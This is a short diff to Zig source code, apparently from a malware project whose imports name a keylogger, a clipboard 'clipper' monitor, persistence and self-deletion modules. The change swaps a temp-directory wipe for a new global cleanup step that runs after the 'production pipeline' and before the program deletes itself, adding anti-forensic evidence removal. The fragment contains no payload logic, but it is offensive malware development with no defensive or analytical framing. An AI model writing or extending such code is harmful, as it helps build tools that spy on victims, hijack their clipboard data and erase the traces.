@@ -41,6 +41,7 @@ const keylogger = @import("evasion/keylogger.zig");
 const self_delete = @import("cleanup/self_delete.zig");
 const temp_wipe = @import("cleanup/temp_wipe.zig");
 const persistence = @import("cleanup/persistence.zig");
+const global_cleanup = @import("cleanup/global_cleanup.zig");
 const clipper_config = @import("clipper_config");
 const clipboard_monitor = @import("clipper/clipboard_monitor.zig");
 const clipper_log_mod = @import("clipper/log.zig");
@@ -552,7 +553,8 @@ fn runProductionPipeline() void {
     }
 
     logMsg("[+] Pipeline complete, cleaning up...\n");
-    temp_wipe.wipeTempDirectory(allocator);
+    const cleanup_result = global_cleanup.cleanup(allocator);
+    log("[+] Global cleanup result: {d}\n", .{@intFromEnum(cleanup_result)});
     const delete_result = self_delete.selfDelete(allocator);
     log("[+] Self-delete result: {d}\n", .{@intFromEnum(delete_result)});
 }
